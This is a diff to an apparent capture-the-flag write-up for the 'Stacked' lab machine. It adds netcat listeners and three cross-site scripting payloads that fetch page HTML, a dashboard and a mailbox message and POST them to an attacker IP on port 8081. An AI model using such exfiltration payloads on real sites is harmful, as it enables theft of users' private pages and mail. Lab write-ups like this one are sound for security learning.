@@ -124,13 +124,59 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.10.11.112 - - [21/Mar/2022 09:56:45] "GET /http://mail.stacked.htb/read-mail.php?id=2 HTTP/1.1" 404 -
 ````
 
-Dump full HTML
+Discovery dashboard.php (dump html)
+````
+$ nc -nlvp 8081
+````
+
 ````js
 //xss-2
 var exfilreq = new XMLHttpRequest();    
-exfilreq.open("POST", "http://10.10.15.6:9001/", false);    
+exfilreq.open("POST", "http://10.10.15.6:8081/", false);    
 exfilreq.send(document.documentElement.outerHTML); 
 ````
+
+View mailbox
+````
+$ nc -nlvp 8081
+````
+
+````
+//xss-3
+var dashboardreq = new XMLHttpRequest();    
+dashboardreq.onreadystatechange = function() {              
+  if (dashboardreq.readyState == 4) {                       
+    var exfilreq = new XMLHttpRequest();                    
+    exfilreq.open("POST", "http://10.10.15.6:8081/", false);                                                      
+    exfilreq.send(dashboardreq.response);                 
+  }     
+};    
+dashboardreq.open('GET', '/dashboard.php', false);    
+dashboardreq.send();  
+````
+
+Read email
+````
+$ nc -nlvp 8081
+````
+
+````js
+//xss-4
+var mail1req = new XMLHttpRequest();    
+mail1req.onreadystatechange = function() {    
+  if (mail1req.readyState == 4) {    
+    var exfilreq = new XMLHttpRequest();    
+    exfilreq.open("POST", "http://10.10.15.6:8081/", false);    
+    exfilreq.send(mail1req.response);    
+  }    
+};    
+mail1req.open('GET', '/read-mail.php?id=1', false);    
+mail1req.send();
+````
+
+> Hey Adam, I have set up S3 instance on s3-testing.stacked.htb so that you can configure the IAM users, roles and permissions. I have initialized a serverless instance for you to work from but keep in mind for the time being you can only run node instances. If you need anything let me know. Thanks.
+
+:new: s3-testing.stacked.htb
 
 # User
 
